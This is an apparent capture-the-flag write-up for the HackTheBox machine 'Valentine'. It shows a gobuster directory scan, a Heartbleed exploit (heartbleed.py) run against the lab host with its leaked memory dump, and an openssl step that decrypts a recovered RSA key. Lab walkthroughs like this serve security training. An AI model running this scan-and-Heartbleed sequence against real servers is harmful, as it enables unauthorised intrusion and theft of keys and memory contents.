# Valentine - HackTheBox - 10.129.228.224
...
```
$gobuster dir -u http://10.129.228.224 -w /usr/share/wordlists/dirb/common.txt -x txt,php,conf,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.224
[+] Method:                  GET
[+] Threads:                 10
...
/dev                  (Status: 301) [Size: 314] [--> http://10.129.228.224/dev/]
...
![Alt text](dev.png?raw=true "dev")

- The hype_key has the following content:
...
- Apparently there is a heartbleed vulnerability too

- Used `searchsploit` to search for the exploit

```
python heartbleed.py 10.129.228.224       
Trying SSL 3.0...
Connecting...
...
Received heartbeat response:
  ...
  0160: 07 29 8B E0 42 4C 26 59 8A 65 55 7C 78 2C 8D 0F  .)..BL&Y.eU|x,..
  0170: 7C 18 85 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  |...............
  0180: 00 02 01 01 00 33 00 26 00 24 00 1D 00 20 4D 3B  .....3.&.$... M;
  0190: 8D 47 27 13 57 EC C9 56 6B 7C 30 32 8B 9F EB 2E  .G'.W..Vk|02....
  01a0: FC 69 3A 06 F1 02 AE B9 A6 A3 7A B1 11 04 00 15  .i:.......z.....
  01b0: 00 4E 00 00 00 00 00 00 00 00 00 00 00 00 00 00  .N..............
  01c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  01d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  01e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  01f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0200: 07 9B 0C 27 1B AE 44 ED 4A 06 06 06 06 06 06 06  ...'..D.J.......
...
$openssl rsa -in hype_key_e -out hype_key_d
